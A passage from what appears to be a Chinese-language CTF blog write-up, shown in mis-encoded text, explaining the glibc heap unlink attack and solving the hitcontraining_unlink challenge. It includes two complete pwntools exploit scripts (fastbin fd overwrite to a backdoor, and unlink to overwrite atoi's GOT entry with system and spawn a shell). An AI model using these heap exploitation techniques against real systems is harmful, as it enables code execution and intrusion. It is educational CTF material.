æ­¤é€šè¿‡äº†æ£€æŸ¥</p></blockquote><p>ä»¥æ­¤ç±»æ¨ï¼Œæˆ‘ä»¬è®©BKçš„å€¼å†™æˆ&amp;P-0x10ï¼Œä¹Ÿå°±å¯ä»¥ç»•è¿‡æ£€æŸ¥ã€‚</p><p>å…ˆæ‹ä¸€ä¸‹ï¼Œæˆ‘ä»¬ç°åœ¨æ˜¯åˆ©ç”¨æº¢å‡ºçš„æ–¹å¼å°†P-&gt;fd (ä¹Ÿå°±æ˜¯FD) å’ŒP-&gt;bk (ä¹Ÿå°±æ˜¯BK)åˆ†åˆ«ä¿®æ”¹ä¸ºäº† <code>&amp;P-0x18</code> å’Œ <code>&amp;P-0x10</code>  ,è€Œæˆ‘ä»¬åˆšåˆšé€šè¿‡äº†ifçš„æ£€æŸ¥ï¼Œå› æ­¤ç°åœ¨ <code>FD-&gt;bk ==P</code> <code> BK-&gt;fd == P</code>(æ¥ä¸‹æ¥è¦è¿›è¡Œç­‰é‡ä»£æ¢ï¼Œå› æ­¤è¿™äº›å€¼è¦è®°ä½)</p><p>æ¥ä¸‹æ¥æ‰§è¡Œçš„æ˜¯</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">FD-&gt;bk = BK;      </span><br><span class="line">BK-&gt;fd = FD;</span><br></pre></td></tr></table></figure><p>å°†åˆšåˆšè¯´è¿‡çš„å€¼è¿›è¡Œç­‰é‡ä»£æ¢</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">FD-&gt;bk=BK &lt;==&gt; P=&amp;P<span class="number">-0x10</span></span><br><span class="line">BK-&gt;fd=FD &lt;==&gt; P=&amp;P<span class="number">-0x18</span></span><br></pre></td></tr></table></figure><p>å› ä¸ºæ˜¯å…ˆæ‰§è¡ŒFD-&gt;bk&#x3D;BK åæ‰§è¡Œçš„BK-&gt;fd&#x3D;FDï¼Œä¹Ÿå°±æ˜¯ç­‰åŒäºå…ˆæ‰§è¡Œçš„P&#x3D;&amp;P-0x10ï¼Œåæ‰§è¡Œçš„P&#x3D;&amp;P-0x18ã€‚ <strong>æ‰€ä»¥æœ€åPçš„å€¼ç­‰äº&amp;p-0x18</strong></p><p>&amp;Pæ˜¯å•¥ï¼Ÿå®ƒæ˜¯Pçš„åœ°å€ï¼Œå› æ­¤&amp;PæŒ‡å‘äº†Pã€‚</p><p><img src="/../img/2706180-20220625220421408-1786229210.png"></p><p>æˆ‘ä»¬åœ¨bssæ®µå‘ç°äº†&amp;P ï¼ˆ0x1cf9030æ˜¯Pï¼‰</p><p>è¡¥å……ï¼šç”±äºbssæ®µä¸Šè®°å½•äº†ç”³è¯·çš„chunkæ‰€åœ¨çš„ä½ç½®ï¼Œæ¢å¥è¯è¯´ï¼Œæˆ‘ä»¬ç”³è¯·çš„chunkåœ¨å“ªï¼Œæ˜¯ç”±bssæ®µä¸Šè®°å½•çš„ä¿¡æ¯è¯´äº†ç®—ã€‚bssæ®µæ˜¯æ€ä¹ˆè®°å½•ä¿¡æ¯çš„ï¼Ÿå°±æ˜¯ç”¨æŒ‡é’ˆçš„æ–¹å¼æ¥è®°å½•çš„ï¼Œbssæ®µä¸­çš„å†…å­˜å•å…ƒä¸­å­˜æ”¾çš„å°±æ˜¯chunkçš„åœ°å€ï¼Œä¹Ÿå°±æ˜¯è¯´bssæ®µä¸ŠæŸä¸ªåœ°å€æŒ‡å‘äº†ç”³è¯·chunkçš„åœ°å€ï¼ˆè¿™é‡ŒæŒ‡çš„æ˜¯chunkçš„ç”¨æˆ·åœ°å€ï¼‰ã€‚</p><p>æœ€åç”¨ä¸¤å¥è¯æ¥è¯´ä¸€ä¸‹åˆ©ç”¨unlinkæ¼æ´çš„æ¡ä»¶å’Œunlinkæ¼æ´äº§ç”Ÿçš„æ•ˆæœã€‚</p><blockquote><p>åˆ©ç”¨æ¡ä»¶ï¼šåˆ©ç”¨æº¢å‡ºä¼ªé€ ä¸€ä¸ªfake_chunkï¼Œç„¶åfreeæ‰é«˜åœ°å€çš„é‚£ä¸ªå †å—ï¼Œè§¦å‘unlink</p><p>åˆ©ç”¨åæ•ˆæœï¼šæœ€åå°†fake_chunkçš„åœ°å€ï¼ˆä¹Ÿå°±æ˜¯Pçš„å€¼ï¼‰ä¿®æ”¹ä¸º&amp;P-0x18ï¼Œä¹‹åå†å¾€På†™å…¥æ•°æ®ï¼Œå°±å¯ä»¥ä¿®æ”¹bssæ®µä¸Šå­˜å‚¨çš„chunkä¿¡æ¯äº†ã€‚</p></blockquote><h2 id="å®æˆ˜unlink"><a href="#å®æˆ˜unlink" class="headerlink" title="å®æˆ˜unlink"></a>å®æˆ˜unlink</h2><h3 id="hitcontraining-unlink"><a href="#hitcontraining-unlink" class="headerlink" title="hitcontraining_unlink"></a>hitcontraining_unlink</h3><h4 id="ä¿æŠ¤ç­–ç•¥ï¼š"><a href="#ä¿æŠ¤ç­–ç•¥ï¼š" class="headerlink" title="ä¿æŠ¤ç­–ç•¥ï¼š"></a>ä¿æŠ¤ç­–ç•¥ï¼š</h4><p><img src="/../img/2706180-20220625220447316-229285179.png"></p><h4 id="é¢˜ç›®åˆ†æï¼š"><a href="#é¢˜ç›®åˆ†æï¼š" class="headerlink" title="é¢˜ç›®åˆ†æï¼š"></a>é¢˜ç›®åˆ†æï¼š</h4><p>2.23çš„libcï¼Œå¦‚æœä¸æƒ³æ‰‹åŠ¨patch libcçš„è¯ï¼Œå¯ä»¥è¯•è¯•æˆ‘å†™çš„å°å·¥å…· <a href="https://www.cnblogs.com/ZIKH26/articles/16243431.html">patchtup</a>ã€‚å®ƒå¯ä»¥è‡ªåŠ¨patch æŒ‡å®šçš„libcã€‚ï¼ˆæ•ˆæœå¦‚ä¸‹ï¼‰<br><img src="/../img/2706180-20220625220544926-1942268274.png"></p><p>ä¸€ä¸ªèœå•é¢˜ï¼ŒåŒæ—¶å‘ç°äº†åé—¨ã€‚<br><img src="/../img/2706180-20220625220718870-1959637132.png"></p><p>ä¸è¿‡æ ¹æ®ä»¥å¾€çš„æƒ…å†µæ¥çœ‹ï¼Œåœ¨buuä¸Šçš„é¢˜ç›®flagåº”è¯¥ä¸ä¼šåœ¨è¿™ä¸ªä½ç½®ï¼Œä½†æ€»è¦å°è¯•ä¸€ä¸‹çš„ã€‚</p><p>ç¨‹åºçš„æ¼æ´ç‚¹åœ¨change_itemå‡½æ•°é‡Œé¢ï¼Œå‘ç°æ²¡æœ‰å¯¹å†™å…¥æ•°æ®çš„å¤§å°åšæ£€æŸ¥ï¼Œå¯¼è‡´äº†æ­¤å¤„å¯ä»¥æº¢å‡ºã€‚</p><p><img src="/../img/2706180-20220625220754639-1966501539.png"></p><p>åŒæ—¶è¿˜å‘ç°äº†ä¸ªå‡½æ•°æŒ‡é’ˆï¼Œä¸‹é¢æ˜¯å®ƒè¢«è°ƒç”¨çš„åœ°æ–¹ã€‚</p><p><img src="/../img/2706180-20220625220844769-1910492971.png"></p><p>è€Œè¿™ä¸ªæŒ‡é’ˆå®šä¹‰åœ¨è¿™é‡Œï¼ˆä¸‹å›¾ï¼‰ï¼Œå¥½å·§ä¸å·§ï¼Œè¿™ä¸ªæŒ‡é’ˆåˆå­˜åœ¨ä¸€ä¸ªç¨‹åºè‡ªå·±åˆ†é…çš„å †å—ä¸Šã€‚</p><p><img src="/../img/2706180-20220625221003445-87496987.png"></p><h4 id="å¤§è‡´æ€è·¯ï¼ˆæ²¡ç”¨unlinkçš„æ–¹æ³•ï¼‰ï¼š"><a href="#å¤§è‡´æ€è·¯ï¼ˆæ²¡ç”¨unlinkçš„æ–¹æ³•ï¼‰ï¼š" class="headerlink" title="å¤§è‡´æ€è·¯ï¼ˆæ²¡ç”¨unlinkçš„æ–¹æ³•ï¼‰ï¼š"></a>å¤§è‡´æ€è·¯ï¼ˆæ²¡ç”¨unlinkçš„æ–¹æ³•ï¼‰ï¼š</h4><p>è€ƒè™‘åˆ°æœ‰åé—¨å‡½æ•°ï¼ŒåŒæ—¶æ²¡å¼€PIEï¼Œè¿™ä¸ªåé—¨å‡½æ•°æ˜¯å¯ä»¥ç›´æ¥ç”¨çš„ï¼Œè¿™é“é¢˜æ˜¯2.23çš„libcï¼Œå› æ­¤freeæ‰çš„å°å †å—ç›´æ¥è¿›fastbiné‡Œäº†ã€‚æ€è·¯ä¹Ÿæ¯”è¾ƒç®€å•ï¼Œåˆ©ç”¨æº¢å‡ºç¯¡æ”¹fdæŒ‡é’ˆï¼Œå°†fdæŒ‡é’ˆæ”¹æˆç¨‹åºåˆšå¼€å§‹ç”³è¯·çš„chunkåœ°å€ï¼ˆè¿™ä¸ªchunkæ˜¯å­˜æ”¾çš„å‡½æ•°æŒ‡é’ˆï¼‰ï¼Œå†å°†è¿™ä¸ªå †å—ç”³è¯·è¿‡æ¥ï¼Œæ­¤æ—¶æˆ‘ä»¬å°±å¯ä»¥å¯¹è¿™ä¸ªå †å—è¿›è¡Œç¼–è¾‘äº†ï¼Œç›´æ¥ç¯¡æ”¹å‡½æ•°æŒ‡é’ˆä¸ºåé—¨å‡½æ•°çš„åœ°å€ã€‚æœ€åé€‰æ‹©5ï¼Œæ‰§è¡Œä¸€ä¸‹åé—¨å‡½æ•°å³å¯</p><p>ä¸è¿‡æœ€åæ‰“è¿œç¨‹çš„æ—¶å€™ï¼Œflagç¡®å®ä¸åœ¨é‚£ä¸ªä½ç½®ã€‚æˆ‘åœ¨æœ¬åœ°å»ºäº†ä¸ªflagæ–‡ä»¶ï¼Œç¡®å®æ˜¯å¯ä»¥è¯»å‡ºæ¥ä¿¡æ¯çš„ã€‚</p><p><img src="/../img/2706180-20220625221102782-492232474.png"></p><h4 id="ä½¿ç”¨åé—¨å‡½æ•°çš„exp"><a href="#ä½¿ç”¨åé—¨å‡½æ•°çš„exp" class="headerlink" title="ä½¿ç”¨åé—¨å‡½æ•°çš„exp"></a>ä½¿ç”¨åé—¨å‡½æ•°çš„exp</h4><p>è¿™ä¸ªçš„expå¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">p=process(<span class="string">&#x27;./a&#x27;</span>)</span><br><span class="line">gdb.attach(p,<span class="string">&#x27;b *0x400A6F\nb *0x400CDD\nc&#x27;</span>)</span><br><span class="line"><span class="string">&quot;&quot;&quot;ä¸‹é¢è¿™ä¸‰è¡Œä»£ç æ˜¯æˆ‘ç”¨æ¥tmuxåˆ†ä¸‰å±çš„ï¼Œä¸éœ€è¦çš„è¯æ³¨é‡Šå³å¯&quot;&quot;&quot;</span></span><br><span class="line">os.system(<span class="string">&#x27;tmux select-pane -L&#x27;</span>)</span><br><span class="line">os.system(<span class="string">&#x27;tmux split-window&#x27;</span>)</span><br><span class="line">os.system(<span class="string">&#x27;tmux set mouse on&#x27;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>():</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Your choice:&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">lenth,context</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Your choice:&#x27;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Please enter the length of item name:&#x27;</span>,<span class="built_in">str</span>(lenth))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Please enter the name of item:&#x27;</span>,context)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">change</span>(<span class="params">index,lenth,context</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Your choice:&#x27;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Please enter the index of item:&#x27;</span>,index)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Please enter the length of item name:&#x27;</span>,<span class="built_in">str</span>(lenth))</span><br><span class="line">    p.sendafter(<span class="string">&#x27;Please enter the new name of the item:&#x27;</span>,context)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">remove</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Your choice:&#x27;</span>,<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Please enter the index of item:&#x27;</span>,index)</span><br><span class="line"></span><br><span class="line">backdoor=<span class="number">0x400D49</span></span><br><span class="line">payload1=p64(<span class="number">0x0</span>)*<span class="number">3</span>+p64(<span class="number">0x21</span>)<span class="comment">#æ·»åŠ 0x21çš„ç›®çš„æ˜¯ä¸ºäº†é€šè¿‡fastbinä¸­çš„æ£€æŸ¥</span></span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">b&#x27;bbbb&#x27;</span>)</span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">b&#x27;cccc&#x27;</span>)</span><br><span class="line">remove(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">remove(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">change(<span class="string">&#x27;0&#x27;</span>,<span class="number">0x20</span>,payload1)</span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">payload2=p64(<span class="number">0</span>)+p64(backdoor)</span><br><span class="line">add(<span class="number">0x10</span>,payload2)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Your choice:&#x27;</span>,<span class="string">&#x27;5&#x27;</span>)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>ä¸Šé¢è¿™ä¸ªæ€è·¯éå¸¸ç®€å•ï¼Œç®€å•åˆ°æˆ‘è¿™ä¸ªåˆšåˆšæ¥è§¦å †çš„èœé¸¡éƒ½æ„Ÿè§‰æ²¡å¿…è¦å†™è¿‡ç¨‹äº†ï¼Œæˆ‘å°±ç®€å•è®°å½•ä¸‹æˆ‘å½“æ—¶æ€è€ƒçš„ä¸‰ä¸ªâ€œè ¢â€é—®é¢˜å§ã€‚</p><blockquote><p>æœ€å¼€å§‹çš„å­˜æ”¾å‡½æ•°æŒ‡é’ˆçš„å †å—å·²ç»å­˜åœ¨äº†ï¼Œä¸ºä»€ä¹ˆè¦å†æŠŠè¿™ä¸ªå †å—ç”³è¯·ä¸€æ¬¡ï¼Ÿ</p><p>ç­”ï¼šå› ä¸ºæœ€å¼€å§‹è¿™ä¸ªå †å—å¹¶ä¸åœ¨è®°å½•çš„å †å—ç´¢å¼•ä¸­ï¼Œæ¢å¥è¯è¯´æˆ‘ä»¬æ— æ³•å»ç¼–è¾‘è¿™ä¸ªå †å—ï¼ˆå› ä¸ºæ²¡æœ‰å®ƒçš„ç´¢å¼•ï¼‰ï¼Œä½†æ˜¯æˆ‘ä»¬ç”³è¯·çš„å †å—æ˜¯éƒ½æœ‰ç´¢å¼•çš„ï¼Œå› æ­¤éœ€è¦å†æŠŠå­˜åœ¨å‡½æ•°æŒ‡é’ˆçš„å †å—ç”³è¯·ä¸€æ¬¡ã€‚</p></blockquote><blockquote><p>ä¸ºå•¥ä¸èƒ½ç›´æ¥æŠŠfdæŒ‡é’ˆæ”¹æˆåé—¨å‡½æ•°çš„åœ°å€ï¼Œç„¶åç›´æ¥ç”³è¯·å›æ¥ï¼Ÿ</p><p>ç¬¬ä¸€æ²¡æ„ä¹‰ï¼Œç¬¬äºŒmallocä»fastbinä¸­ç”³è¯·çš„å †å—ä¼šè¿›è¡Œä¸€ä¸ªæ£€æŸ¥ï¼ˆåˆ¤æ–­æˆ‘ä»¬éœ€è¦å †å—çš„å¤§å°æ˜¯å¦ç­‰äºè¯¥fastbinä¸­çš„å †å—å¤§å°ï¼‰ï¼Œè¿™ä¸ªæ£€æŸ¥è¿‡ä¸äº†ï¼Œå› ä¸ºfastbinè¿™ä¸ªé‡Œé¢çš„chunkæ˜¯é€šè¿‡ä¿®æ”¹fdæŒ‡é’ˆæ¥ä¼ªé€ çš„ï¼Œå–å¯¹åº”sizeçš„æ—¶å€™è‚¯å®šæ˜¯æœ‰é—®é¢˜çš„</p></blockquote><blockquote><p>å’‹æŠŠfdæŒ‡é’ˆæ”¹æˆç¬¬ä¸€ä¸ªchunkçš„åœ°å€ï¼Ÿ</p><p>å…ˆç”³è¯·ä¸‰ä¸ªå †å—ï¼ŒæŠŠç¬¬ä¸€ä¸ªå †å—ï¼ˆæ˜¯æˆ‘ä»¬ä¸»åŠ¨ç”³è¯·çš„ç¬¬ä¸€ä¸ªå †å—ï¼Œä¸æ˜¯ç¨‹åºè‡ªå·±ç”³è¯·çš„å †å—ï¼‰å½“ä½œæº¢å‡ºå †å—ï¼Œç„¶ååˆ†åˆ«é‡Šæ”¾ç¬¬äºŒä¸ªå †å—å’Œç¬¬ä¸‰ä¸ªå †å—ï¼Œä»è€Œè®©fastbinä¸­å‡ºç°ä¸¤ä¸ªç©ºé—²å †å—ï¼Œæ­¤æ—¶çš„ç¬¬äºŒä¸ªå †å—çš„fdæŒ‡é’ˆæŒ‡å‘äº†ç¬¬ä¸‰ä¸ªå †å—çš„åœ°å€ã€‚æœ€åå‘ç°æ¯æ¬¡ç¨‹åºè‡ªå·±ç”³è¯·çš„é‚£ä¸ªå †å—æœ«å°¾éƒ½æ˜¯00ï¼Œå› æ­¤æˆ‘ä»¬åªéœ€è¦æŠŠç¬¬äºŒä¸ªå †å—çš„fdæŒ‡é’ˆæœ«å°¾å†™æˆ00å³å¯ã€‚è€ƒè™‘åˆ°ç¨‹åºä¼šåœ¨æˆ‘ä»¬è¾“å…¥çš„æœ«å°¾åŠ ä¸ª00ï¼Œå› æ­¤æˆ‘ä»¬åªéœ€è¦å†™å…¥0x20å­—èŠ‚çš„æ•°æ®ï¼ˆç”¨sendå‘é€ï¼‰ï¼Œ00è‡ªåŠ¨å°±å†™å…¥è¿›å»äº†ã€‚</p></blockquote><h4 id="å¤§è‡´æ€è·¯ï¼ˆä½¿ç”¨unlink"><a href="#å¤§è‡´æ€è·¯ï¼ˆä½¿ç”¨unlink" class="headerlink" title="å¤§è‡´æ€è·¯ï¼ˆä½¿ç”¨unlink)"></a>å¤§è‡´æ€è·¯ï¼ˆä½¿ç”¨unlink)</h4><p>åœ¨showå‡½æ•°ä¸­ï¼Œprintf %sæ‰“å°çš„ä¿¡æ¯æ˜¯bssæ®µå­˜æ”¾çš„åœ°å€æ‰€æŒ‡å‘çš„æ•°æ®ã€‚å¯æ˜¯ç°åœ¨æˆ‘ä»¬å·²ç»å¯ä»¥å»ä¿®æ”¹bssæ®µå­˜æ”¾çš„åœ°å€äº†ï¼Œé‚£åªéœ€è¦è®©bssæ®µä¸Šå­˜ä¸€ä¸ªå‡½æ•°çš„gotè¡¨ï¼Œé‚£ä¹ˆæ‰§è¡Œshowå³å¯è¿›è¡Œæ³„éœ²å‡½æ•°çš„çœŸå®åœ°å€ã€‚</p><p><img src="/../img/2706180-20220625221127777-789320050.png"></p><p>åœ¨changeå‡½æ•°ä¸­ï¼Œreadå†™å…¥çš„æ˜¯bssæ®µå­˜æ”¾çš„åœ°å€æ‰€æŒ‡å‘çš„ä¿¡æ¯ï¼Œæˆ‘ä»¬å·²ç»å¯ä»¥å»ä¿®æ”¹bssæ®µå­˜æ”¾çš„åœ°å€ï¼Œå› æ­¤åœ¨bssæ®µä¸Šå­˜ä¸€ä¸ªå‡½æ•°çš„gotè¡¨ï¼Œé‚£ä¹ˆåœ¨æ‰§è¡Œchangeçš„æ—¶å€™ï¼Œå°±å¯ä»¥ä¿®æ”¹å‡½æ•°çš„gotè¡¨ã€‚</p><p><img src="/../img/2706180-20220625221256721-137146817.png"></p><p>æœ€ç»ˆè¿™é“é¢˜çš„æ€è·¯å°±æ˜¯ä¼ªé€ ä¸€ä¸ªfake_chunkï¼Œç„¶åfreeæ‰ä¸€ä¸ªå †å—ï¼Œè§¦å‘unlinkä¸fake_chunkåˆå¹¶ï¼Œè®©fake_chunkçš„åœ°å€æ”¹ä¸º&amp;p-0x18ï¼Œæ­¤æ—¶å¾€fake_chunkä¸­å†™å…¥æ•°æ®ï¼Œå°±ç›¸å½“äºå¾€bssæ®µä¸Šå†™å…¥æ•°æ®ï¼Œè¿›è¡Œç¯¡æ”¹bssæ®µå­˜æ”¾çš„chunkä¿¡æ¯ï¼ˆå†™å…¥atoiå‡½æ•°çš„gotè¡¨è¦†ç›–ç¬¬1ä¸ªchunkçš„åœ°å€ï¼‰ï¼Œç„¶åæ‰§è¡Œshowå‡½æ•°æ³„éœ²atoiçš„çœŸå®åœ°å€ï¼Œå†æ‰§è¡Œchangeå‡½æ•°ï¼Œä¿®æ”¹atoiå‡½æ•°çš„gotè¡¨ä¸ºsystemåœ°å€ï¼Œæœ€åè¾“å…¥&#x2F;bin&#x2F;shè·å–shellã€‚</p><h4 id="EXP"><a href="#EXP" class="headerlink" title="EXP:"></a>EXP:</h4><p>ç›´æ¥ç”¨ä¸‹é¢è¿™ä¸ªè„šæœ¬æ˜¯æ‰“ä¸é€šçš„ï¼Œæˆ‘è‡ªå·±å†™äº†ä¸ªtoolsæ¨¡å—ï¼Œä½¿ç”¨äº†é‡Œé¢è‡ªå·±å®šä¹‰çš„å‡½æ•°ï¼Œå¦‚æœæƒ³ä½¿ç”¨ä¸‹é¢è„šæœ¬çš„è¯å¯ä»¥åœ¨<a href="https://www.cnblogs.com/ZIKH26/articles/16307343.html">è¿™é‡Œ</a>è·å–toolsçš„æºç ï¼Œç„¶ååˆ›å»ºä¸€ä¸ªåä¸ºtoolsçš„pyæ–‡ä»¶ï¼Œæˆ–è€…åˆ å»æˆ‘è‡ªå®šä¹‰çš„å‡½æ•°å³å¯ã€‚</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line">p,e,libc=load(<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">p=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">27507</span>)</span><br><span class="line"><span class="comment">#debug(p,0x400C27,0x400CDD)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>():</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Your choice:&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">lenth,context</span>):</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Your choice:&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Please enter the length of item name:&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(lenth))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Please enter the name of item:&#x27;</span>)</span><br><span class="line">    p.sendline(context)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index,lenth,context</span>):</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Your choice:&#x27;</span>)</span><br><span class="line">    p.send(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Please enter the index of item:&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Please enter the length of item name:&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(lenth))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Please enter the new name of the item:&#x27;</span>)</span><br><span class="line">    p.send(context)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Your choice:&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Please enter the index of item:&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">b&#x27;aaaaaaa&#x27;</span>)</span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">b&#x27;bbbbbbb&#x27;</span>)<span class="comment">#ä¸ºä»€ä¹ˆè¦ç”³è¯·ä¸€ä¸ª0x80å¤§å°çš„chunk?å› ä¸ºå¦‚æœå°äºäº†0x80çš„chunkï¼Œfreeæ‰åä¼šè¿›å…¥fastbinï¼Œè€Œfastbinä¸­æ˜¯ä¸ä¼šè¿›è¡Œåˆå¹¶æ“ä½œçš„ã€‚ç”³è¯·0x80å†åŠ ä¸Š0x10çš„å¤´éƒ¨freeæ‰åå°±å¯ä»¥åˆ°unsortedbin</span></span><br><span class="line"></span><br><span class="line">ptr=<span class="number">0x6020c8</span> <span class="comment">#è¿™ä¸ªåœ°å€ä¸ºå†™å…¥æ•°æ®çš„chunkçš„åœ°å€</span></span><br><span class="line">fake=p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)</span><br><span class="line">fake+=p64(ptr-<span class="number">0x18</span>)+p64(ptr-<span class="number">0x10</span>)</span><br><span class="line">fake+=p64(<span class="number">0x20</span>)+p64(<span class="number">0x90</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0x40</span>,fake)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">atoi_got_addr=e.got[<span class="string">&#x27;atoi&#x27;</span>]</span><br><span class="line">payload=p64(<span class="number">0</span>)*<span class="number">2</span>+p64(<span class="number">0x40</span>)+p64(atoi_got_addr)</span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0x20</span>,payload)</span><br><span class="line">show()</span><br><span class="line">atoi_addr=u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">log(<span class="string">&#x27;atoi_addr&#x27;</span>,<span class="built_in">hex</span>(atoi_addr))</span><br><span class="line"><span class="comment">#sys_addr,bin_sh_addr=local_search(&#x27;atoi&#x27;,atoi_addr,libc)</span></span><br><span class="line">sys_addr,bin_sh_addr=long_search(<span class="string">&#x27;atoi&#x27;</span>,atoi_addr)</span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0x10</span>,p64(sys_addr))</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Your choice:&#x27;</span>)</span><br><span class="line">p.send(<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><img src="/../img/2706180-20220625221316198-16141362.png"></p><h3 id="2014-HITCON-stkof"><a href="#2014-HITCON-stkof" class="headerlink" title="2014 HITCON stkof"></a>2014 HITCON stkof</h3><p>è¿™é“é¢˜è·Ÿhitcontraining_unlinké¢˜ç›®éƒ½æ˜¯ä¸€æ ·çš„æ‰‹æ³•ï¼Œåˆ©ç”¨unlinkè¾¾åˆ°ä¿®æ”¹å‡½æ•°gotè¡¨çš„ç›®çš„ã€‚å”¯ä¸€çš„åŒºåˆ«å°±æ˜¯è¿™é“é¢˜æ²¡æœ‰%så¯»å€æ³„éœ²ï¼Œä¹Ÿå°±æ˜¯æ— æ³•å°†gotè¡¨å†™åˆ°chunkåœ°å€ï¼ˆbssæ®µè®°å½•chunkä¿¡æ¯çš„ä½ç½®ï¼‰æ‰§è¡Œæ‰“å°å‡½æ•°è¿›è¡Œæ³„éœ²ã€‚æ‰€ä»¥éœ€è¦å…ˆåŠ«æŒfreeå‡½æ•°çš„gotè¡¨ä¸ºputså‡½æ•°çš„pltè¡¨ï¼Œç„¶åå†å°†chunkåœ°å€æ”¹ä¸ºputsçš„gotåœ°å€ï¼Œfreeæ‰æ”¹ä¸ºputsçš„gotåœ°å€é‚£ä¸ªå †å—ï¼Œå³å¯è¿›è¡Œæ³„éœ²ã€‚</p><p>ä¸‹é¢ç®€å•åˆ†æä¸€ä¸‹è¿™é“é¢˜ï¼Œé¦–å…ˆè¿™é“é¢˜æ˜¯æ²¡æœ‰èœå•çš„ï¼Œæ ¹æ®é‡Œé¢çš„åŠŸèƒ½è‡ªå·±æ‰¾ä¸€ä¸‹å°±è¡Œäº†ã€‚</p><p><img src="/../img/2706180-20220625221844974-83069417.png"></p><p>è¿™é“é¢˜æœ‰ä¸ªç‚¹æ˜¯ä»¥å‰ä¸çŸ¥é“çš„ã€‚ä¸€èˆ¬çš„é¢˜ç›®éƒ½ä¼šä½¿ç”¨setbufå…³é—­ç¼“å†²åŒºï¼Œä½†æ˜¯è¿™é“é¢˜æ²¡æœ‰ä½¿ç”¨setbufå…³é—­ç¼“å†²åŒºï¼Œç„¶åä½¿ç”¨printfå’Œfgetsçš„æ—¶å€™å‘ç°ä»–ä»¬ä¹Ÿå„è‡ªç”³è¯·äº†ä¸€ä¸ªå †å—ã€‚ä¸ºäº†æ¢ç©¶åŸå› 